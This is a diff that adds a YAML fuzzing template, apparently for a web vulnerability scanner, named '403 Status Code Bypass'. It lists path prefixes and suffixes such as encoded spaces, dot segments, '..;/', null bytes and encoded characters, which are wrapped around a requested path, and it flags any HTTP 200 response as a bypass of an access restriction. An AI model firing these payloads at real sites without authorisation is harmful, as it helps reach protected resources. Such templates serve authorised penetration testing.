@@ -1,0 +1,50 @@
+id: 403-Status-Bypass
+type: fuzz
+info:
+  Author: Gocha Okradze
+  name: 403 Status Code Bypass
+  risk: High
+  
+variables:
+  - prefix: |
+        %20
+        %2e
+        ./
+        /./
+        /
+        //
+        ..;/
+      
+  - sufix: |
+        %20
+        %09
+        ./
+        /./
+        //
+        /
+        /*
+        /.
+        ?
+        ??
+        &
+        %23
+        ???
+        /%25
+        /.dummy
+        .json
+        /dummy/..;/
+        ..;/
+        %00
+        %0d
+        %3f
+        %26
+  
+payloads:
+  - \[\[.original\]\]
+  
+requests:
+  - generators:
+      - Path("{{.prefix}}{{.payload}}{{.sufix}}","last")
+      - Path("{{.payload}}{{.sufix}}", "last")
+    detections:
+      - StatusCode() == 200
